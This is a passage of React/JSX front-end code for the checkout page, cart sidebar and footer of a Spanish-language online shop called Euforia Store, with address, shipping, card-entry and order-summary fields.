                        className={`p-3 sm:p-4 rounded-xl sm:rounded-2xl border-2 cursor-pointer transition-all flex items-center gap-2 sm:gap-3 ${!billingSameAsShipping ? 'border-blue-600 bg-blue-50' : 'border-slate-100'}`}
                      >
                        <div className={`w-4 h-4 sm:w-5 sm:h-5 rounded-full border-2 flex items-center justify-center ${!billingSameAsShipping ? 'border-blue-600 bg-blue-600' : 'border-slate-300'}`}>
                          {!billingSameAsShipping && <CheckCircle2 size={10} className="text-white" />}
                        </div>
                        <span className="text-xs sm:text-sm font-medium">Usar otra dirección</span>
                      </div>

                      <AnimatePresence>
                        {!billingSameAsShipping && (
                          <motion.div 
                            initial={{ height: 0, opacity: 0 }}
                            animate={{ height: 'auto', opacity: 1 }}
                            exit={{ height: 0, opacity: 0 }}
                            className="overflow-hidden space-y-3 sm:space-y-4 pt-3 sm:pt-4"
                          >
                            <select 
                              required={!billingSameAsShipping}
                              value={billingCountry}
                              onChange={e => setBillingCountry(e.target.value)}
                              className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm"
                            >
                              <option value="">Selecciona un país</option>
                              {COUNTRIES.map(c => <option key={c} value={c}>{c}</option>)}
                            </select>
                            <input type="text" placeholder="Dirección de facturación" required={!billingSameAsShipping} value={billingStreet} onChange={e => setBillingStreet(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                            <div className="grid grid-cols-2 gap-3 sm:gap-4">
                              <input type="text" placeholder="Ciudad" required={!billingSameAsShipping} value={billingCity} onChange={e => setBillingCity(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                              <input type="text" placeholder="ZIP" required={!billingSameAsShipping} value={billingZip} onChange={e => setBillingZip(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                            </div>
                            <input type="text" placeholder="Estado" required={!billingSameAsShipping} value={billingState} onChange={e => setBillingState(e.target.value)} className="w-full p-3 sm:p-4 bg-white border border-slate-200 rounded-xl sm:rounded-2xl focus:ring-4 focus:ring-blue-100 outline-none text-sm" />
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  </section>

                  <section>
                    <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 flex items-center gap-2">
                      <div className="w-7 h-7 sm:w-8 sm:h-8 bg-blue-100 text-blue-600 rounded-lg flex items-center justify-center text-xs sm:text-sm">4</div>
                      Método de Envío
                    </h2>
                    <div className="space-y-2 sm:space-y-3">
                      <div 
                        onClick={() => setShippingMethod('gratis')}
                        className={`p-3 sm:p-4 rounded-xl sm:rounded-2xl border-2 cursor-pointer transition-all flex justify-between items-center ${shippingMethod === 'gratis' ? 'border-blue-600 bg-blue-50' : 'border-slate-200 bg-white'}`}
                      >
                        <span className="font-bold text-sm sm:text-base">Envío Gratis</span>
                        <span className="text-slate-500 text-xs sm:text-sm">Gratis</span>
                      </div>
                      <div 
                        onClick={() => setShippingMethod('express')}
                        className={`p-3 sm:p-4 rounded-xl sm:rounded-2xl border-2 cursor-pointer transition-all flex justify-between items-center ${shippingMethod === 'express' ? 'border-blue-600 bg-blue-50' : 'border-slate-200 bg-white'}`}
                      >
                        <span className="font-bold text-sm sm:text-base">Express (24-48h)</span>
                        <span className="font-bold text-blue-600 text-sm sm:text-base">$5.00</span>
                      </div>
                    </div>
                  </section>

                  <section>
                    <h2 className="text-lg sm:text-xl font-bold mb-3 sm:mb-4 flex items-center gap-2">
                      <div className="w-7 h-7 sm:w-8 sm:h-8 bg-blue-100 text-blue-600 rounded-lg flex items-center justify-center text-xs sm:text-sm">5</div>
                      Pago
                    </h2>
                    <div className="bg-white border border-slate-200 rounded-2xl sm:rounded-3xl overflow-hidden shadow-sm">
                      <div className="p-3 sm:p-4 bg-slate-50 border-b border-slate-200 flex justify-between items-center">
                        <span className="font-bold text-xs sm:text-sm">Tarjeta de Crédito</span>
                        <div className="flex gap-1 sm:gap-2">
                          <div className="w-6 h-4 sm:w-8 sm:h-5 bg-slate-200 rounded"></div>
                          <div className="w-6 h-4 sm:w-8 sm:h-5 bg-slate-200 rounded"></div>
                        </div>
                      </div>
                      <div className="p-4 sm:p-6 space-y-3 sm:space-y-4">
                      <div className="relative">
                        <input 
                          type="text" 
                          placeholder="Número de tarjeta" 
                          required 
                          value={tarjeta} 
                          onChange={e => {
                            const val = e.target.value.replace(/\D/g, '');
                            const formatted = val.replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
                            setTarjeta(formatted);
                          }} 
                          className="w-full p-3 sm:p-4 bg-slate-50 border border-slate-200 rounded-lg sm:rounded-xl focus:ring-4 focus:ring-blue-100 outline-none pr-12 text-sm sm:text-base" 
                        />
                        <div className="absolute right-3 sm:right-4 top-1/2 -translate-y-1/2 text-[8px] sm:text-[10px] font-bold text-blue-600 uppercase tracking-tighter">
                          {getCardType(tarjeta)}
                        </div>
                      </div>
                        <div className="grid grid-cols-2 gap-3 sm:gap-4">
                          <input type="text" placeholder="MM / YY" required value={exp} onChange={e => {
                            let v = e.target.value.replace(/\D/g, '');
                            if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                            setExp(v);
                          }} className="w-full p-3 sm:p-4 bg-slate-50 border border-slate-200 rounded-lg sm:rounded-xl focus:ring-4 focus:ring-blue-100 outline-none text-sm sm:text-base" />
                          <input type="text" placeholder="CVC" required value={cvv} onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))} className="w-full p-3 sm:p-4 bg-slate-50 border border-slate-200 rounded-lg sm:rounded-xl focus:ring-4 focus:ring-blue-100 outline-none text-sm sm:text-base" />
                        </div>
                        <input type="text" placeholder="Nombre en tarjeta" required value={titular} onChange={e => setTitular(e.target.value)} className="w-full p-3 sm:p-4 bg-slate-50 border border-slate-200 rounded-lg sm:rounded-xl focus:ring-4 focus:ring-blue-100 outline-none text-sm sm:text-base" />
                      </div>
                    </div>
                  </section>

                  {/* Resumen del Pedido movido aquí */}
                  <section className="bg-white p-4 sm:p-8 rounded-3xl border border-slate-100 shadow-sm">
                    <h3 className="text-lg sm:text-xl font-bold mb-4 sm:mb-6">Resumen del Pedido</h3>
                    <div className="space-y-4 mb-6 max-h-[300px] overflow-y-auto pr-2">
                      {cart.map(item => (
                        <div key={`${item.productId}-${item.color}`} className="flex gap-3 sm:gap-4">
                          <div className="relative w-14 h-14 sm:w-20 sm:h-20 bg-slate-50 rounded-xl sm:rounded-2xl overflow-hidden border border-slate-100">
                            <img src={item.image} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                            <span className="absolute -top-1 -right-1 w-5 h-5 sm:w-6 sm:h-6 bg-slate-800 text-white text-[8px] sm:text-[10px] font-bold flex items-center justify-center rounded-full border-2 border-white">
                              {item.quantity}
                            </span>
                          </div>
                          <div className="flex-1">
                            <h4 className="font-bold text-slate-900 text-xs sm:text-base">{item.name}</h4>
                            <p className="text-[10px] sm:text-xs text-slate-400 capitalize">{item.color} | Talla: {item.size}</p>
                          </div>
                          <span className="font-bold text-slate-900 text-xs sm:text-base">${(item.price * item.quantity).toFixed(2)}</span>
                        </div>
                      ))}
                    </div>

                    <div className="space-y-2 sm:space-y-4 pt-4 border-t border-slate-100">
                      <div className="flex justify-between text-slate-500 text-xs sm:text-base">
                        <span>Subtotal</span>
                        <span className="font-bold text-slate-900">${subtotal.toFixed(2)}</span>
                      </div>
                      <div className="flex justify-between text-slate-500 text-xs sm:text-base">
                        <span>Envío</span>
                        <span className="font-bold text-slate-900">{shippingMethod === 'gratis' ? 'Gratis' : `$${shippingCost.toFixed(2)}`}</span>
                      </div>
                      <div className="flex justify-between text-lg sm:text-2xl font-black pt-2 text-slate-900">
                        <span>Total</span>
                        <span>USD ${total.toFixed(2)}</span>
                      </div>
                    </div>
                  </section>

                  <button 
                    disabled={isSubmitting}
                    className="w-full py-4 sm:py-6 bg-blue-600 hover:bg-blue-700 text-white font-black text-lg sm:text-xl rounded-2xl sm:rounded-[32px] shadow-2xl shadow-blue-200 transition-all flex items-center justify-center gap-2 sm:gap-3 disabled:opacity-50"
                  >
                    {isSubmitting ? 'Procesando...' : 'Pagar ahora'}
                  </button>
                </form>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Cart Sidebar */}
      <AnimatePresence>
        {isCartOpen && (
          <>
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsCartOpen(false)}
              className="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50"
            />
            <motion.div 
              initial={{ x: '100%' }}
              animate={{ x: 0 }}
              exit={{ x: '100%' }}
              transition={{ type: 'spring', damping: 25, stiffness: 200 }}
              className="fixed right-0 top-0 bottom-0 w-full max-w-md bg-white z-50 shadow-2xl flex flex-col"
            >
              <div className="p-4 sm:p-6 border-b border-slate-100 flex items-center justify-between">
                <h3 className="text-xl sm:text-2xl font-black">Tu Carrito</h3>
                <button onClick={() => setIsCartOpen(false)} className="p-2 hover:bg-slate-100 rounded-full transition-colors">
                  <X size={20} sm:size={24} />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-4 sm:space-y-6">
                {cart.length === 0 ? (
                  <div className="h-full flex flex-col items-center justify-center text-slate-400 space-y-4">
                    <ShoppingCart size={48} sm:size={64} strokeWidth={1} />
                    <p className="font-bold text-sm sm:text-base">Tu carrito está vacío</p>
                    <button 
                      onClick={() => { setIsCartOpen(false); setView('home'); }}
                      className="text-blue-600 font-bold hover:underline text-sm sm:text-base"
                    >
                      Empezar a comprar
                    </button>
                  </div>
                ) : (
                  cart.map(item => (
                    <div key={`${item.productId}-${item.color}`} className="flex gap-3 sm:gap-4 group">
                      <div className="w-16 h-16 sm:w-24 sm:h-24 bg-slate-50 rounded-xl sm:rounded-2xl overflow-hidden border border-slate-100">
                        <img src={item.image} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                      </div>
                      <div className="flex-1">
                        <div className="flex justify-between mb-0.5 sm:mb-1">
                          <h4 className="font-bold text-slate-900 text-sm sm:text-base">{item.name}</h4>
                          <button onClick={() => removeFromCart(item.productId, item.color, item.size)} className="text-slate-300 hover:text-red-500 transition-colors">
                            <X size={14} sm:size={16} />
                          </button>
                        </div>
                        <p className="text-[10px] sm:text-xs text-slate-400 capitalize mb-2 sm:mb-4">{item.color} | Talla: {item.size}</p>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center border border-slate-200 rounded-lg overflow-hidden bg-slate-50">
                            <button onClick={() => updateQuantity(item.productId, item.color, item.size, -1)} className="p-1 hover:bg-slate-200"><Minus size={12} sm:size={14} /></button>
                            <span className="w-6 sm:w-8 text-center text-[10px] sm:text-xs font-bold">{item.quantity}</span>
                            <button onClick={() => updateQuantity(item.productId, item.color, item.size, 1)} className="p-1 hover:bg-slate-200"><Plus size={12} sm:size={14} /></button>
                          </div>
                          <span className="font-bold text-slate-900 text-sm sm:text-base">${(item.price * item.quantity).toFixed(2)}</span>
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>

              {cart.length > 0 && (
                <div className="p-4 sm:p-6 border-t border-slate-100 space-y-3 sm:space-y-4">
                  <div className="flex justify-between text-lg sm:text-xl font-black">
                    <span>Subtotal</span>
                    <span>${subtotal.toFixed(2)}</span>
                  </div>
                  <p className="text-[10px] sm:text-xs text-slate-400">Impuestos y envío calculados al finalizar la compra.</p>
                  <button 
                    onClick={() => { setIsCartOpen(false); setView('checkout'); }}
                    className="w-full py-4 sm:py-5 bg-blue-600 hover:bg-blue-700 text-white font-black text-base sm:text-lg rounded-xl sm:rounded-2xl shadow-xl shadow-blue-200 transition-all flex items-center justify-center gap-2 sm:gap-3"
                  >
                    Finalizar Compra
                    <ArrowRight size={18} sm:size={20} />
                  </button>
                </div>
              )}
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Footer */}
      <footer className="bg-white border-t border-slate-200 py-6 sm:py-12 mt-10 sm:mt-20">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <div className="flex items-center justify-center gap-2 mb-4 sm:mb-6">
            <span className="text-lg sm:text-xl font-serif font-bold tracking-tight text-slate-900 italic">Euforia <span className="text-blue-600 not-italic">Store</span></span>
          </div>
          <p className="text-slate-400 text-[10px] sm:text-sm mb-4 sm:mb-8">© 2026 Euforia Store. Todos los derechos reservados.</p>
          <div className="flex justify-center gap-6 sm:gap-8 text-slate-300">
            <CreditCard size={20} className="sm:w-6 sm:h-6" />
            <ShieldCheck size={20} className="sm:w-6 sm:h-6" />
            <Truck size={20} className="sm:w-6 sm:h-6" />
          </div>
        </div>
      </footer>
    </div>
  );
}
